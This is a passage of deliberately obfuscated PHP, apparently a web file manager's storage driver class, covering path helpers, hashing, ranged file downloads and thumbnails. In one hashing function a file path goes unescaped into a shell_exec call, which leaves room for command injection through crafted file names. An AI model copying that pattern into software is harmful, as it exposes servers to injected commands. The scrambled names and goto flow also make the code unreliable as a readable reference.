$this->delFile($C×äô÷Ñ›); } return $this->delFolder($C×äô÷Ñ›); } public function rename($FŸ¥Å“é±, $dœæÏ„†Šà) { } public function exist($F“™²ç£öÈ) { } public function findByHash($e““‚§„œ« = '', $b¤òâƒŠ„¸ = '') { return !1; } public function isFile($dÚˆÙ¼®™Ÿ) { } public function isFolder($aÂÁ‹Ğ¸ËŞ) { } public function size($AŞ­§Ğ‹Š) { } public function info($Eæä¸à× Ì) { } public function infoSimple($A‹ÙÆ¾½†Š) { return $this->info($A‹ÙÆ¾½†Š); } public function infoAuth($CÚÜø«ç£) { return $this->info($CÚÜø«ç£); } public function infoFull($eÎôæ‚öë‹) { return $this->info($eÎôæ‚öë‹); } public function infoWithChildren($Eí½çêùË‘) { $FÒïÉšÎÛ =& $_SERVER[³‘’¼äÑ™ÔÍ]; static $CÑæÏ¯‹ = array(); if (isset($CÑæÏ¯‹[$Eí½çêùË‘])) { return $CÑæÏ¯‹[$Eí½çêùË‘]; } $dõ•§ˆ®ï = $this->info($Eí½çêùË‘); if ($dõ•§ˆ®ï && $dõ•§ˆ®ï[$FÒïÉšÎÛ[29]] == $FÒïÉšÎÛ[76]) { $CÛÒİÛ„‹§ = array($FÒïÉšÎÛ[77] => 0, $FÒïÉšÎÛ[78] => 0, $FÒïÉšÎÛ[79] => 0); $this->infoChildren($Eí½çêùË‘, $CÛÒİÛ„‹§); $dõ•§ˆ®ï[$FÒïÉšÎÛ[77]] = $CÛÒİÛ„‹§[$FÒïÉšÎÛ[77]]; $dõ•§ˆ®ï[$FÒïÉšÎÛ[80]] = array($FÒïÉšÎÛ[81] => $CÛÒİÛ„‹§[$FÒïÉšÎÛ[78]], $FÒïÉšÎÛ[82] => $CÛÒİÛ„‹§[$FÒïÉšÎÛ[79]]); $CÑæÏ¯‹[$Eí½çêùË‘] = $dõ•§ˆ®ï; } return $dõ•§ˆ®ï; } public function listPath($FİŞ´Îƒç¶, $bíøá¸¡Œ = false) { } public function has($a²ŠÎ°§é¥, $fßÓ…Û£‘ = false, $f‘ğÓ¹îÀÉ = false) { } public function canRead($eÚŸäï•®´) { } public function canWrite($cĞáõìô®Ã) { } public function getContent($bİÔ‡ÍÊö) { } public function setContent($dİÛ§˜²‚À, $e×åÕåµ° = '') { } protected function infoChildren($f•¨”¬•§—, &$f“¨‡Í™Å) { $E·æğøÂÈ =& $_SERVER[³‘’¼äÑ™ÔÍ]; check_abort(); $F¯†÷–—« = $this->listPath($f•¨”¬•§—, !0); $F¯†÷–—« = array_merge($F¯†÷–—«[$E·æğøÂÈ[74]], $F¯†÷–—«[$E·æğøÂÈ[73]]); foreach ($F¯†÷–—« as $E­¡ÊÕ»Œ) { if ($E­¡ÊÕ»Œ[$E·æğøÂÈ[29]] == $E·æğøÂÈ[76]) { $f“¨‡Í™Å[$E·æğøÂÈ[79]]++; $aŒ—Ø‡™çÊ = $this->getPathInner($E­¡ÊÕ»Œ[$E·æğøÂÈ[75]]); $this->infoChildren($aŒ—Ø‡™çÊ, $f“¨‡Í™Å); } else { $f“¨‡Í™Å[$E·æğøÂÈ[78]]++; $f“¨‡Í™Å[$E·æğøÂÈ[77]] += $E­¡ÊÕ»Œ[$E·æğøÂÈ[77]]; } } } public function fileSubstr($aÑøİ‰ÇÍÕ, $a¶ÕĞ§Æ¡, $BÖ±Ê÷µ–—) { } public function listAll($dÀÈÒ§ÀŠ†) { } public function upload($e—Ä³ÃÍ¥È, $f¶ËÎ——Â¯, $BŞ”»æ†ªË = false, $aíÔíªÚÆ = REPEAT_REPLACE) { } public function uploadFileByID($aİİÑÖÓ…å, $B¢ªÌƒ‹… , $dÁŞöêÖ…·) { } public function uploadFileByPath($a´‰–¶‰›, $bÃ¯‚Ú®¯­, $DàÉìöó† = array()) { } public function isUploadServer() { $cÍĞÖ²Ñ¼ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $cÍĞÖ²Ñ¼[83]) { return !0; } return $GLOBALS[$cÍĞÖ²Ñ¼[6]][$cÍĞÖ²Ñ¼[84]][$cÍĞÖ²Ñ¼[85]]; } public function isFileOutServer() { $bÁğõ‰‹³ö =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $bÁğõ‰‹³ö[83]) { return !0; } return $GLOBALS[$bÁğõ‰‹³ö[6]][$bÁğõ‰‹³ö[84]][$bÁğõ‰‹³ö[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($aîßŞÜÅ») { $Bš‘âæ„… =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->isCdnHost()) { return $aîßŞÜÅ»; } return str_replace(trim(get_url_root($aîßŞÜÅ»), $Bš‘âæ„…[8]), trim($this->cdnHost, $Bš‘âæ„…[8]), $aîßŞÜÅ»); } public function uploadLink($C•œôì¼Á‡, $Fë¨çÄ›ç = 0) { goto dºË‘–´¹ç; d˜ù´Â…Ü·: if (!in_array($eÌ‹­ÄÀ‘ô, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $cÎöƒ»ŠÍÇ = 1024 * 1024 * 10; goto fÔß¢¡ÊË; dºË‘–´¹ç: $C¨ØÍÓè´ç =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($this->isUploadServer()) { return; } $eÌ‹­ÄÀ‘ô = $this->getType(); goto d˜ù´Â…Ü·; fÔß¢¡ÊË: $AŠ‘›·í™¹ = $Fë¨çÄ›ç <= $cÎöƒ»ŠÍÇ ? $C¨ØÍÓè´ç[87] : $C¨ØÍÓè´ç[88]; $aØ©Ò»Š•ø = (!$Fë¨çÄ›ç ? 1 : ceil($Fë¨çÄ›ç / pow(1024, 3))) * 3600 * 4; $E¯×âÒ® = $this->{$AŠ‘›·í™¹}($C•œôì¼Á‡, $aØ©Ò»Š•ø); goto cËëæ³ä¨ï; cËëæ³ä¨ï: if ($E¯×âÒ®) { $E¯×âÒ®[$C¨ØÍÓè´ç[89]] = $C•œôì¼Á‡; $E¯×âÒ®[$C¨ØÍÓè´ç[90]] = $eÌ‹­ÄÀ‘ô; } return $E¯×âÒ®; goto e¡¼—ùïœÇ; e¡¼—ùïœÇ: } public function uploadFormData($BƒĞŒòŞ½î, $DîÀÚ–»Ğ = 3600) { } public function multiUploadFormData($C¼ŸÎğŒñ¯, $e‡Ş­©¬ç = 3600) { } public function download($aœßõáÊŠ, $eœÅæîÇª¶) { } public function ext($FâÊ–ö¥§‰) { $b¹´¥¸‚Ô =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (strpos($FâÊ–ö¥§‰, $b¹´¥¸‚Ô[8]) === -1) { $BçÀ±†¬ˆ = $FâÊ–ö¥§‰; } else { $BçÀ±†¬ˆ = $this->pathThis($FâÊ–ö¥§‰); } $F˜âÅÌÎÉœ = $b¹´¥¸‚Ô[33]; if (strstr($BçÀ±†¬ˆ, $b¹´¥¸‚Ô[91])) { $F˜âÅÌÎÉœ = substr($BçÀ±†¬ˆ, strrpos($BçÀ±†¬ˆ, $b¹´¥¸‚Ô[91]) + 1); $F˜âÅÌÎÉœ = strtolower($F˜âÅÌÎÉœ); } if (strlen($F˜âÅÌÎÉœ) > 3 && preg_match($b¹´¥¸‚Ô[92], $F˜âÅÌÎÉœ, $FÔéøÀÈ‹ó)) { $F˜âÅÌÎÉœ = $b¹´¥¸‚Ô[33]; } return $F˜âÅÌÎÉœ; } public function pathThis($Däæœ¹éÛß) { $c­ù©ßÁùî =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Däæœ¹éÛß = str_replace($c­ù©ßÁùî[93], $c­ù©ßÁùî[8], rtrim($Däæœ¹éÛß, $c­ù©ßÁùî[8])); $D™ºòèœÈ¿ = strrpos($Däæœ¹éÛß, $c­ù©ßÁùî[8]); if ($D™ºòèœÈ¿ === !1) { return $Däæœ¹éÛß; } return substr($Däæœ¹éÛß, $D™ºòèœÈ¿ + 1); } public function pathFather($DŸä¹¢ŒÃŒ) { $bµÇ¦©áé¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DŸä¹¢ŒÃŒ = str_replace($bµÇ¦©áé¢[93], $bµÇ¦©áé¢[8], rtrim($DŸä¹¢ŒÃŒ, $bµÇ¦©áé¢[8])); $e¡÷Ÿ”Í®È = strrpos($DŸä¹¢ŒÃŒ, $bµÇ¦©áé¢[8]); if ($e¡÷Ÿ”Í®È === !1) { return $bµÇ¦©áé¢[33]; } return substr($DŸä¹¢ŒÃŒ, 0, $e¡÷Ÿ”Í®È + 1); } public function hashSimple($EãøÍöà¹) { goto dĞÍİ·†Ÿ‘; F˜‰‰«¿™¦: $d‰’ÃÅçé = intval($F–ÒéÄÏ‹ß / $eÜ‘•òÚß); $CÉÑÛè¬•¥ = $fÖªĞµ‘Áš[33]; for ($aàïÜÑ¾…¦ = 0; $aàïÜÑ¾…¦ < $eÜ‘•òÚß; $aàïÜÑ¾…¦++) { $CÉÑÛè¬•¥ .= $this->fileSubstr($EãøÍöà¹, $d‰’ÃÅçé * $aàïÜÑ¾…¦, $F¦ï×õóÄ•); } goto B»Ï†ÏµÂÑ; B»Ï†ÏµÂÑ: $CÉÑÛè¬•¥ .= $this->fileSubstr($EãøÍöà¹, $F–ÒéÄÏ‹ß - $F¦ï×õóÄ•, $F¦ï×õóÄ•); return md5($CÉÑÛè¬•¥) . $F–ÒéÄÏ‹ß; goto dŠåŸ¦Ê×‰; fÔ£ç¯‹êæ: $F¦ï×õóÄ• = 200; $eÜ‘•òÚß = 50; if ($F–ÒéÄÏ‹ß <= $F¦ï×õóÄ• * $eÜ‘•òÚß) { return $this->hashMd5($EãøÍöà¹) . $F–ÒéÄÏ‹ß; } goto F˜‰‰«¿™¦; dĞÍİ·†Ÿ‘: $fÖªĞµ‘Áš =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$EãøÍöà¹) { return md5($fÖªĞµ‘Áš[33]); } $F–ÒéÄÏ‹ß = $this->size($EãøÍöà¹); goto fÔ£ç¯‹êæ; dŠåŸ¦Ê×‰: } public static $md5Cache = array(); public function hashMd5($bª¬Šéˆ¦•) { $bª¬Šéˆ¦• = $this->iconvSystem($bª¬Šéˆ¦•); if (isset(self::$md5Cache[$bª¬Šéˆ¦•])) { return self::$md5Cache[$bª¬Šéˆ¦•]; } self::$md5Cache[$bª¬Šéˆ¦•] = $this->hashMd5Shell($bª¬Šéˆ¦•); if (!self::$md5Cache[$bª¬Šéˆ¦•]) { self::$md5Cache[$bª¬Šéˆ¦•] = @md5_file($bª¬Šéˆ¦•); } return self::$md5Cache[$bª¬Šéˆ¦•]; } private function hashMd5Shell($DÈ¶ššÉã) { goto E‘‚…÷¿ ; cÌßˆÆÓ©: $Bõ®‡´áäà = shell_exec($Aò×½õ‡èæ . "\40\42{$DÈ¶ššÉã}\42"); $Bõ®‡´áäà = str_replace($FÛ›·ùŒğ[100], $FÛ›·ùŒğ[33], $Bõ®‡´áäà); return substr($Bõ®‡´áäà, 0, 32); goto EÅ³Ì±; b‹•°’îº®: $Aò×½õ‡èæ = Cache::get($FÛ›·ùŒğ[97]); if (!$Aò×½õ‡èæ) { $eÊİ­ŒìÄÔ = BASIC_PATH . $FÛ›·ùŒğ[98]; $cøÅ­˜¢Ö = md5_file($eÊİ­ŒìÄÔ); $Aò×½õ‡èæ = $FÛ›·ùŒğ[99]; foreach ($CÒ©ô¦‰Æ‘ as $B¡¨×§âÉ) { $Bõ®‡´áäà = shell_exec($B¡¨×§âÉ . "\40\x22{$eÊİ­ŒìÄÔ}\x22"); if ($Bõ®‡´áäà && substr(trim($Bõ®‡´áäà), 0, 32) == $cøÅ­˜¢Ö) { $Aò×½õ‡èæ = $B¡¨×§âÉ; break; } } Cache::set($FÛ›·ùŒğ[97], $Aò×½õ‡èæ, 3600); } if ($Aò×½õ‡èæ == $FÛ›·ùŒğ[99]) { return !1; } goto cÌßˆÆÓ©; E‘‚…÷¿ : $FÛ›·ùŒğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!function_exists($FÛ›·ùŒğ[94])) { return !1; } $CÒ©ô¦‰Æ‘ = array($FÛ›·ùŒğ[95], $FÛ›·ùŒğ[96]); goto b‹•°’îº®; EÅ³Ì±: } public function link($dà˜‡¦†¶) { return $dà˜‡¦†¶; } public function fileOut($BøÙÖùğô, $a²Î¶²Š²° = false, $Fƒòíô®É› = false, $D‹Ñ£ªœìˆ = '') { goto b’ÖÛ©©¸¦; BŒ©ñÛÑ¢¬: $C¸áÃ”¹—Ú = $d•ËÃÌ•¼å[$e¤æµåâ´[77]]; $cœÓÅ•á = gmdate($e¤æµåâ´[106], $d•ËÃÌ•¼å[$e¤æµåâ´[107]]); $b×ø‚ÔÍŸî = $Fƒòíô®É› ? $Fƒòíô®É› : $this->iconvApp($d•ËÃÌ•¼å[$e¤æµåâ´[28]]); goto aÚ¦¿ï“Àá; d°Ñ±¢­†¼: header($e¤æµåâ´[135] . $C¸áÃ”¹—Ú); header($e¤æµåâ´[136]); if (!$a²Î¶²Š²° && $bÂ‰¨¶²¹Â == $e¤æµåâ´[137]) { if ($C¸áÃ”¹—Ú > 1024 * 1024 * 5) { die; } $fõÛğ–áÑ£ = $this->getContent($BøÙÖùğô); $fõÛğ–áÑ£ = Html::clearSVG($fõÛğ–áÑ£); header($e¤æµåâ´[138] . $C¸áÃ”¹—Ú); echo $fõÛğ–áÑ£; die; } goto a˜¡¥Š¤‹; F÷ÜÆ©Ú: header($e¤æµåâ´[121]); header($e¤æµåâ´[122] . $b‘‘´â¹Ê); header($e¤æµåâ´[123] . gmdate($e¤æµåâ´[106], time() + 3600 * 24 * 30) . $e¤æµåâ´[124]); goto AÌæª¥«œÊ; eŠñä‚ó«: if (isset($_SERVER[$e¤æµåâ´[128]]) && strtotime($_SERVER[$e¤æµåâ´[128]]) == $d•ËÃÌ•¼å[$e¤æµåâ´[107]]) { header($e¤æµåâ´[129], !0, 304); die; } if (isset($_SERVER[$e¤æµåâ´[130]]) && $_SERVER[$e¤æµåâ´[130]] == $D‹Ñ£ªœìˆ) { header($e¤æµåâ´[131] . $D‹Ñ£ªœìˆ, !0, 304); die; } header($e¤æµåâ´[131] . $D‹Ñ£ªœìˆ); goto eÁß“òÏËµ; c¬¥ö¡œÙ£: if (in_array($bÂ‰¨¶²¹Â, array($e¤æµåâ´[108], $e¤æµåâ´[109], $e¤æµåâ´[110], $e¤æµåâ´[111]))) { $bÂ‰¨¶²¹Â = $e¤æµåâ´[112]; } if (!$D‹Ñ£ªœìˆ) { $D‹Ñ£ªœìˆ = md5($cœÓÅ•á . $this->hashSimple($BøÙÖùğô)); } $D‹Ñ£ªœìˆ = $e¤æµåâ´[113] . $D‹Ñ£ªœìˆ . $e¤æµåâ´[113]; goto cİ£‰ÎÜ; DŠêÓÌÊê‰: $e¿å†ÙÀĞö = $this->getType() == $e¤æµåâ´[102]; $B÷‡Ñ—Š¿Ÿ = $GLOBALS[$e¤æµåâ´[6]][$e¤æµåâ´[84]][$e¤æµåâ´[103]][$e¤æµåâ´[104]]; $Aæî¤¨Îİ = (double) $GLOBALS[$e¤æµåâ´[6]][$e¤æµåâ´[84]][$e¤æµåâ´[103]][$e¤æµåâ´[105]] * 1024 * 1024; goto cÂÔ’’‹É; AÌæª¥«œÊ: header($e¤æµåâ´[125]); header($e¤æµåâ´[126]); header($e¤æµåâ´[127]); goto eŠñä‚ó«; b’ÖÛ©©¸¦: $e¤æµåâ´ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->cacheMethod(null, null); if (!$BøÙÖùğô || !$this->exist($BøÙÖùğô)) { show_json(LNG($e¤æµåâ´[101]), !1, $Fƒòíô®É›); } goto DŠêÓÌÊê‰; cİ£‰ÎÜ: $b‘‘´â¹Ê = get_file_mime($bÂ‰¨¶²¹Â); if (strstr($b‘‘´â¹Ê, $e¤æµåâ´[114])) { $b‘‘´â¹Ê = $b‘‘´â¹Ê . $e¤æµåâ´[115]; } if ($a²Î¶²Š²° === !1 && !mime_support($b‘‘´â¹Ê)) { $a²Î¶²Š²° = !0; $b‘‘´â¹Ê = $e¤æµåâ´[116]; } goto C†‘öŸ¨Ãå; a˜¡¥Š¤‹: $AÎ÷İ›¢ÒÍ = strtolower($_SERVER[$e¤æµåâ´[139]]); if ($e¿å†ÙÀĞö && $AÎ÷İ›¢ÒÍ && $B÷‡Ñ—Š¿Ÿ) { if (strstr($AÎ÷İ›¢ÒÍ, $e¤æµåâ´[140])) { header($e¤æµåâ´[141] . $BøÙÖùğô); } else { if (strstr($AÎ÷İ›¢ÒÍ, $e¤æµåâ´[142])) { header($e¤æµåâ´[143] . $BøÙÖùğô); } else { if (strstr($AÎ÷İ›¢ÒÍ, $e¤æµåâ´[144])) { header($e¤æµåâ´[145] . $BøÙÖùğô); } } } if ($Aæî¤¨Îİ) { header($e¤æµåâ´[146] . $Aæî¤¨Îİ); } return; } if (isset($_SERVER[$e¤æµåâ´[147]])) { if (preg_match($e¤æµåâ´[148], $_SERVER[$e¤æµåâ´[147]], $B‚™ÈÈ±‹Æ)) { $cÁŸ‰ŒŞ¼Ö = intval($B‚™ÈÈ±‹Æ[1]); if (!empty($B‚™ÈÈ±‹Æ[2])) { $DÛ¬‘ÁÂº = intval($B‚™ÈÈ±‹Æ[2]); } } header($e¤æµåâ´[149]); header("\x43\x6f\x6e\x74\145\x6e\164\55\122\141\156\147\145\x3a\40\142\171\x74\145\x73\40{$cÁŸ‰ŒŞ¼Ö}\x2d{$DÛ¬‘ÁÂº}\57" . $C¸áÃ”¹—Ú); } else { header($e¤æµåâ´[150]); } goto cÕÛÃœÉÛÙ; cÕÛÃœÉÛÙ: $a§¸É°…Ïâ = !0; if ($_SERVER[$e¤æµåâ´[151]] == $e¤æµåâ´[152] && $C¸áÃ”¹—Ú > 1204 * 1024 * 1024 * 2) { $a§¸É°…Ïâ = !1; } if ($a§¸É°…Ïâ) { header($e¤æµåâ´[153] . ($DÛ¬‘ÁÂº - $cÁŸ‰ŒŞ¼Ö + 1)); } goto Eğ÷±«±¨; aÚ¦¿ï“Àá: $cÁŸ‰ŒŞ¼Ö = 0; $DÛ¬‘ÁÂº = $C¸áÃ”¹—Ú - 1; $bÂ‰¨¶²¹Â = $this->ext($b×ø‚ÔÍŸî); goto c¬¥ö¡œÙ£; Eğ÷±«±¨: if ($_SERVER[$e¤æµåâ´[154]] == $e¤æµåâ´[155]) { return; } $d“ñ›¡¿œ¼ = 1024 * 100; $cÈß®¡Öé = 0; goto D˜Œß¸; C†‘öŸ¨Ãå: $aÕŸºĞÇ£» = rawurlencode($b×ø‚ÔÍŸî); $aÕŸºĞÇ£» = $e¤æµåâ´[113] . $aÕŸºĞÇ£» . $e¤æµåâ´[117] . $aÕŸºĞÇ£»; if ($a²Î¶²Š²°) { header($e¤æµåâ´[118]); header($e¤æµåâ´[119] . $aÕŸºĞÇ£»); } else { header($e¤æµåâ´[120] . $aÕŸºĞÇ£»); } goto F÷ÜÆ©Ú; D˜Œß¸: if ($Aæî¤¨Îİ) { $cÈß®¡Öé = intval(1000 * 1000 * ($d“ñ›¡¿œ¼ / $Aæî¤¨Îİ)); } while ($cÁŸ‰ŒŞ¼Ö <= $DÛ¬‘ÁÂº) { $BÎ•†šğò… = timeFloat(); check_abort(); $bå‡‰›ê†º = $DÛ¬‘ÁÂº - $cÁŸ‰ŒŞ¼Ö + 1; if ($bå‡‰›ê†º <= $d“ñ›¡¿œ¼) { $d“ñ›¡¿œ¼ = $bå‡‰›ê†º; } echo $this->fileSubstr($BøÙÖùğô, $cÁŸ‰ŒŞ¼Ö, $d“ñ›¡¿œ¼); $cÁŸ‰ŒŞ¼Ö += $d“ñ›¡¿œ¼; if ($d“ñ›¡¿œ¼ == $bå‡‰›ê†º) { $cÁŸ‰ŒŞ¼Ö = $DÛ¬‘ÁÂº + 1; } if ($cÈß®¡Öé) { $F²Òñù¿¹ = intval(1000 * 1000 * (timeFloat() - $BÎ•†šğò…)); $aˆ¥ÈÜÎ¾Ÿ = $cÈß®¡Öé - $F²Òñù¿¹; if ($aˆ¥ÈÜÎ¾Ÿ > 5) { usleep($aˆ¥ÈÜÎ¾Ÿ); } } } goto EìÉ§ˆ³; cÂÔ’’‹É: @ob_end_clean(); set_timeout(); $d•ËÃÌ•¼å = $this->infoFull($BøÙÖùğô); goto BŒ©ñÛÑ¢¬; eÁß“òÏËµ: header($e¤æµåâ´[132] . $cœÓÅ•á . $e¤æµåâ´[124]); header($e¤æµåâ´[133] . $b×ø‚ÔÍŸî); header($e¤æµåâ´[134]); goto d°Ñ±¢­†¼; EìÉ§ˆ³: } public function fileOutServer($BÅÓé–ŒÃô, $Dï˜˜–ŠÜ¿ = false, $D ¥»ƒä¼ = false, $cïË£îËÓå = '') { $this->fileOut($BÅÓé–ŒÃô, $Dï˜˜–ŠÜ¿, $D ¥»ƒä¼, $cïË£îËÓå); } public function fileOutLink($e¯šâ“Ì†÷) { header($_SERVER[³‘’¼äÑ™ÔÍ][156] . $e¯šâ“Ì†÷); die; } public function cacheMethod($BÂ„ŒîŞ«, $E‡³¾“¨) { goto bôÃ……©·ó; f¬«è›Úİï: $EÅáÖööáñ = $F÷Æ†¥¦²[157] . $BÂ„ŒîŞ« . $F÷Æ†¥¦²[158] . rtrim($FØµ’Õ†, $F÷Æ†¥¦²[8]); if (is_null($BÂ„ŒîŞ«)) { $D—®•´àä’ = array(); return; } if (is_null($E‡³¾“¨)) { unset($D—®•´àä’[$EÅáÖööáñ]); return; } goto E©¶ÙöÄ£¥; bôÃ……©·ó: $F÷Æ†¥¦² =& $_SERVER[³‘’¼äÑ™ÔÍ]; static $D—®•´àä’ = array(); $FØµ’Õ† = $E‡³¾“¨ ? ltrim($this->getPathOuter($E‡³¾“¨), $F÷Æ†¥¦²[8]) : $E‡³¾“¨; goto f¬«è›Úİï; E©¶ÙöÄ£¥: $FˆàÉ‚‰Á = isset($D—®•´àä’[$EÅáÖööáñ]) ? $D—®•´àä’[$EÅáÖööáñ] : null; if (!is_null($FˆàÉ‚‰Á)) { return $FˆàÉ‚‰Á; } $FˆàÉ‚‰Á = $this->{$BÂ„ŒîŞ«}($E‡³¾“¨); goto C¯†êóğç; C¯†êóğç: $D—®•´àä’[$EÅáÖööáñ] = $FˆàÉ‚‰Á; return $FˆàÉ‚‰Á; goto BêÍ§à¼É; BêÍ§à¼É: } public function fileOutImage($dŞ†™î•‚´, $F§ëÅ…ÖÜö = 250) { goto b¢ƒß¬ç÷; dŠ¦ğÇ»ˆ·: $cÆ¦ŒŸ¼Õ¬ = DATA_THUMB . $A¡…Ş­²‚; if (!@file_exists($cÆ¦ŒŸ¼Õ¬)) { $eõ¢ì«òß = TEMP_FILES; if (!is_dir($eõ¢ì«òß)) { mk_dir($eõ¢ì«òß); } $Fâ¼¬×¹å¢ = $eõ¢ì«òß . $EåÜ¥Ûˆ×† . $bÏÜØ–É³ª[91] . $A±¬°·£İá[$bÏÜØ–É³ª[160]]; if (!@file_exists($Fâ¼¬×¹å¢)) { $Fâ¼¬×¹å¢ = $this->download($dŞ†™î•‚´, $Fâ¼¬×¹å¢); } $B‚•Èª = new ImageThumb($Fâ¼¬×¹å¢, $bÏÜØ–É³ª[167]); $B‚•Èª->prorate($cÆ¦ŒŸ¼Õ¬, $F§ëÅ…ÖÜö, $F§ëÅ…ÖÜö * 10); } if (!file_exists($cÆ¦ŒŸ¼Õ¬) || filesize($cÆ¦ŒŸ¼Õ¬) < 100) { return @file_exists($Fâ¼¬×¹å¢) ? IO::fileOut($Fâ¼¬×¹å¢) : $this->fileOut($dŞ†™î•‚´); } goto fÂÀ¾Ãª; A‡ÈÈâ‹ì¡: if ($A±¬°·£İá[$bÏÜØ–É³ª[77]] <= 1024 * 50 || !function_exists($bÏÜØ–É³ª[159]) || $A±¬°·£İá[$bÏÜØ–É³ª[160]] == $bÏÜØ–É³ª[161]) { return $this->fileOut($dŞ†™î•‚´); } if (isset($A±¬°·£İá[$bÏÜØ–É³ª[162]][$bÏÜØ–É³ª[163]])) { $EåÜ¥Ûˆ×† = $A±¬°·£İá[$bÏÜØ–É³ª[162]][$bÏÜØ–É³ª[163]]; } else { if (isset($A±¬°·£İá[$bÏÜØ–É³ª[162]][$bÏÜØ–É³ª[164]])) { $EåÜ¥Ûˆ×† = $A±¬°·£İá[$bÏÜØ–É³ª[162]][$bÏÜØ–É³ª[164]]; } else { $EåÜ¥Ûˆ×† = md5("{$A±¬°·£İá[$bÏÜØ–É³ª[28]]}\137{$A±¬°·£İá[$bÏÜØ–É³ª[75]]}\x5f{$A±¬°·£İá[$bÏÜØ–É³ª[77]]}"); } } $A¡…Ş­²‚ = "{$EåÜ¥Ûˆ×†}\x5f{$F§ëÅ…ÖÜö}\x2e\x70\x6e\147"; goto FÃğâèÙˆŒ; fÂÀ¾Ãª: if (!($bÈ‚‡®Ÿ¯ø = IO::move($cÆ¦ŒŸ¼Õ¬, $EäĞ‰ØáÚ£))) { return IO::fileOut($cÆ¦ŒŸ¼Õ¬); } del_file($cÆ¦ŒŸ¼Õ¬); IO::fileOut($bÈ‚‡®Ÿ¯ø); goto Aâ‹¶Á‚õî; FÃğâèÙˆŒ: if (!($EÏòÊ¤ÖÎ¼ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $bÏÜØ–É³ª[165]))) { $EäĞ‰ØáÚ£ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $bÏÜØ–É³ª[166]); } else { $EäĞ‰ØáÚ£ = KodIO::make($EÏòÊ¤ÖÎ¼); } if ($EÏòÊ¤ÖÎ¼ = IO::fileNameExist($EäĞ‰ØáÚ£, $A¡…Ş­²‚)) { $cÆ¦ŒŸ¼Õ¬ = KodIO::make($EÏòÊ¤ÖÎ¼); return IO::fileOut($cÆ¦ŒŸ¼Õ¬); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto dŠ¦ğÇ»ˆ·; b¢ƒß¬ç÷: $bÏÜØ–É³ª =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (substr($dŞ†™î•‚´, 0, 4) == $bÏÜØ–É³ª[144]) { $this->fileOutLink($dŞ†™î•‚´); } $A±¬°·£İá = $this->info($dŞ†™î•‚´); goto A‡ÈÈâ‹ì¡; Aâ‹¶Á‚õî: } public function fileOutImageServer($aÊš¦Ï¤»ì, $b³ğ·„« = 250) { $this->fileOutImage($aÊš¦Ï¤»ì, $b³ğ·„«); } public function fileNameAuto($B¦Æ‚„˜Ğ¾, $FÇ®›–àÜñ, $a½²øŠ„¼– = REPEAT_RENAME, $c¬‰êêÜ = false) { goto dÍ·Üä¬; dÍ·Üä¬: $b Ø¸íãÉÁ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d‹­ñÈÓ¨¶ = $B¦Æ‚„˜Ğ¾ === $b Ø¸íãÉÁ[33] ? $FÇ®›–àÜñ : rtrim($B¦Æ‚„˜Ğ¾, $b Ø¸íãÉÁ[8]) . $b Ø¸íãÉÁ[8] . $FÇ®›–àÜñ; if ($a½²øŠ„¼– == REPEAT_REPLACE || !$this->exist($d‹­ñÈÓ¨¶) || $c¬‰êêÜ && $a½²øŠ„¼– != REPEAT_RENAME_FOLDER) { return $FÇ®›–àÜñ; } goto dÀ¾ÜÔÔä; A£Æ˜Á‹‰Ä: while ($this->exist(rtrim($B¦Æ‚„˜Ğ¾, $b Ø¸íãÉÁ[8]) . $b Ø¸íãÉÁ[8] . $aŸùˆ£…Ü)) { $aŸùˆ£…Ü = $Cß÷Œö½œá . "\x28{$FÛÄÜ»»’Æ}\51{$eõ‘ãŞ›ñÜ}"; $FÛÄÜ»»’Æ++; } return $aŸùˆ£…Ü; goto AÄß¥¥Ş¶; dÀ¾ÜÔÔä: if ($a½²øŠ„¼– == REPEAT_SKIP) { return !1; } $eõ‘ãŞ›ñÜ = $b Ø¸íãÉÁ[91] . get_path_ext($FÇ®›–àÜñ); $eõ‘ãŞ›ñÜ = $eõ‘ãŞ›ñÜ == $b Ø¸íãÉÁ[91] || $c¬‰êêÜ ? $b Ø¸íãÉÁ[33] : $eõ‘ãŞ›ñÜ; goto f‘ò²ë—š¬; f‘ò²ë—š¬: $FÛÄÜ»»’Æ = 1; $Cß÷Œö½œá = substr($FÇ®›–àÜñ, 0, strlen($FÇ®›–àÜñ) - strlen($eõ‘ãŞ›ñÜ)); $aŸùˆ£…Ü = $Cß÷Œö½œá . "\50{$FÛÄÜ»»’Æ}\51{$eõ‘ãŞ›ñÜ}"; goto A£Æ˜Á‹‰Ä; AÄß¥¥Ş¶: } public function listAllFiles($E‰Á¹†Å, $aÌ¯±éÓæ, $dä÷÷Á‹ñ¼ = array()) { goto a‘í¬ŠØ¼î; AÍ§Œ¹ù‹—: $E‰Á¹†Å = trim($E‰Á¹†Å, $aš¼†•¾Ç[8]); foreach ($aÌ¯±éÓæ as $aàÂ°êÈ») { $a°…ã¼Ê• = ltrim(substr($aàÂ°êÈ», strlen($E‰Á¹†Å)), $aš¼†•¾Ç[8]); $A‹´‹»İµ = array_merge($A‹´‹»İµ, $this->slicePath($a°…ã¼Ê•)); } $B©¥¡ç’›î = array(); goto dËá’ä; a‘í¬ŠØ¼î: $aš¼†•¾Ç =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($aÌ¯±éÓæ)) { return array(); } $A‹´‹»İµ = array(); goto AÍ§Œ¹ù‹—; dËá’ä: foreach (array_unique($A‹´‹»İµ) as $aàÂ°êÈ») { $f¥î­İ›˜Ø = array($aš¼†•¾Ç[75] => $this->getPathOuter($aš¼†•¾Ç[8] . $E‰Á¹†Å . $aš¼†•¾Ç[8] . $aàÂ°êÈ»), 